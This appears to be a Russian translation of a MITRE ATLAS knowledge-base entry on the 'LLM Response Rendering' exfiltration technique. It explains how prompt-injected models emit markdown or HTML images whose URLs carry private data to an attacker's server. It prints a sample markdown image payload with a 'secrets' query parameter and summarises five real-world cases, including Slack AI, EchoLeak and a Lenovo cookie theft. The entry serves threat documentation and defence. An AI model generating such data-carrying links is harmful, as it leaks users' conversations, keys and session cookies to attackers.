---
atlas_id: AML.T0077
atlas_type: technique
attack_ref_id: ""
attack_ref_url: ""
created_date: "2025-04-15"
description: Злоумышленники могут добиться того, чтобы большая языковая модель (LLM) вернула приватную информацию в составе ссылки на внешний контент. При рендеринге такой ссылки клиент пользователя отправляет запрос на сервер,...
generated: true
generated_by: atlasgen
maturity: demonstrated
mitigation_count: 0
modified_date: "2026-09-15"
platforms:
    - Generative AI
    - Agentic AI
procedure_count: 5
source_name: LLM Response Rendering
subtechnique_count: 0
subtechnique_of: ""
tactics:
    - AML.TA0010
title: Рендеринг ответа LLM
url: /techniques/AML.T0077/
---

Злоумышленники могут добиться того, чтобы большая языковая модель (LLM) вернула приватную информацию в составе ссылки на внешний контент. При рендеринге такой ссылки клиент пользователя отправляет запрос на сервер, контролируемый злоумышленником, что приводит к эксфильтрации данных. Приватная информация может оставаться скрытой от пользователя, а внешний контент — корректно отображаться в его клиенте, не вызывая подозрений.

Отображаемый контент может включать изображения, встроенные веб-страницы или предпросмотры ссылок; для его рендеринга могут использоваться HTML, Markdown или другие механизмы. Приватная информация может быть скрыта в различных частях URL, ведущего на сервер злоумышленника, включая параметры запроса и сегменты пути URL, а также разделена между несколькими запросами. Изображения, заданные с помощью Markdown или HTML-тегов, могут автоматически отображаться непосредственно в клиенте ИИ-чата пользователя. Интеграции с такими приложениями, как Slack или Microsoft Teams, могут автоматически отображать внешний контент без каких-либо действий со стороны пользователя.

Например, злоумышленник может манипулировать LLM, чтобы она сгенерировала следующий markdown:
```
![ATLAS](https://atlas.mitre.org/image.png?secrets="private data")
```

Клиент отрендерит его как:
```
<img src="https://atlas.mitre.org/image.png?secrets="private data">
```

Когда запрос поступает на сервер злоумышленника, где размещено запрошенное изображение, злоумышленник получает содержимое параметра запроса `secrets`.


## Тактики

<div class="relation-list">
<a class="relation-item" href="/tactics/AML.TA0010/"><span class="relation-id">AML.TA0010</span><strong>Эксфильтрация</strong></a>
</div>


## Примеры процедур из кейсов

<div class="relation-list procedure-relations">
<a class="relation-item" href="/studies/AML.CS0021/"><span class="relation-id">AML.CS0021</span><strong>Эксфильтрация разговоров ChatGPT</strong><span class="relation-meta">Актор: Embrace The Red / Тактика: AML.TA0010 Эксфильтрация</span><p>ChatGPT автоматически отображает изображение пользователю, из-за чего отправляет запрос на сервер злоумышленника и передает туда разговор пользователя.</p></a>
<a class="relation-item" href="/studies/AML.CS0029/"><span class="relation-id">AML.CS0029</span><strong>Эксфильтрация разговоров Google Bard</strong><span class="relation-meta">Актор: Embrace the Red / Тактика: AML.TA0010 Эксфильтрация</span><p>Bard автоматически отображает Markdown-разметку, отправляя запрос к Google Apps Script и тем самым эксфильтруя разговор пользователя. Content Security Policy Bard разрешает такой запрос, потому что URL размещен на домене, принадлежащем Google.</p></a>
<a class="relation-item" href="/studies/AML.CS0035/"><span class="relation-id">AML.CS0035</span><strong>Эксфильтрация данных из Slack AI через косвенную промпт-инъекцию</strong><span class="relation-meta">Актор: PromptArmor / Тактика: AML.TA0010 Эксфильтрация</span><p>В соответствии с вредоносными инструкциями ответ отображается как ссылка для перехода, в URL которой закодирован API-ключ жертвы. Фрагмент ответа: Жертву вводят в заблуждение: она думает, что должна нажать на ссылку для повторной аутентификации, после чего ее API-ключ отправляется на сервер под контролем злоумышленника.</p></a>
<a class="relation-item" href="/studies/AML.CS0059/"><span class="relation-id">AML.CS0059</span><strong>EchoLeak: промпт-инъекция нулевого клика против M365 Copilot для эксфильтрации данных</strong><span class="relation-meta">Актор: Aim Labs / Тактика: AML.TA0010 Эксфильтрация</span><p>Copilot отобразил изображение Markdown, URL которого кодировал конфиденциальную информацию. Клиент автоматически попытался загрузить изображение, создав путь эксфильтрации без клика.</p></a>
<a class="relation-item" href="/studies/AML.CS0060/"><span class="relation-id">AML.CS0060</span><strong>Межсайтовый скриптинг (XSS) через манипуляцию промптом в ИИ-чат-боте Lenovo</strong><span class="relation-meta">Актор: Cybernews Research Team / Тактика: AML.TA0010 Эксфильтрация</span><p>Активный cookie сеанса добавлялся в параметр запроса тега изображения в HTML-нагрузке. Изображение не существовало, однако неудачная загрузка изображения все равно отправляла запрос на сервер, подконтрольный злоумышленнику, эксфильтруя cookie сеанса.</p></a>
</div>
